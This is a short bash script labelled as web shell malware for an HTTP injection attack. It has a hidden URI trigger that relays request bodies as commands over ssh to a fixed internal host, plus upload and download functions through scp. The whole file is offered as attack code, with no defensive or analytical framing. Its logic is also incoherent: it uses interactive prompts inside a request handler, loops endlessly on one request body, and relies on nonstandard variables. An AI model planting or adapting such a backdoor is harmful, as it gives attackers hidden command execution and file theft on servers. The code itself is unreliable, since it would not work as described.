#!/bin/bash

# Web Shell Malware for HTTP Injection Attack

function interactive_shell() {
    while true; do
        read -d '' cmd << EOF
${HTTP_RAW_BODY}
EOF

        response=$(echo "$cmd" | ssh user@192.168.0.1)

        echo -n ">>> "
        echo "$response"
    done
}

function file_operations() {
    case $HTTP_URI in
        *upload*)
            read -p "Enter remote file path: " file_path
            read -p "Enter local file path: " local_file_path

            scp "$local_file_path" user@192.168.0.1:"$file_path"
            ;;
        *download*)
            read -p "Enter remote file path: " file_path
            read -p "Enter local destination path: " local_dest

            scp user@192.168.0.1:"$file_path" "$local_dest"
            ;;
    esac
}

if [ "${HTTP_REQUEST_URI}" == "/key/hiddenparam=value" ]; then
    interactive_shell
elif [[ "${HTTP_REQUEST_URI}" =~ ^/upload ]]; then
    file_operations
elif [[ "${HTTP_REQUEST_URI}" =~ ^/download ]]; then
    file_operations
else
    echo "Unknown request"
fi

exit 0
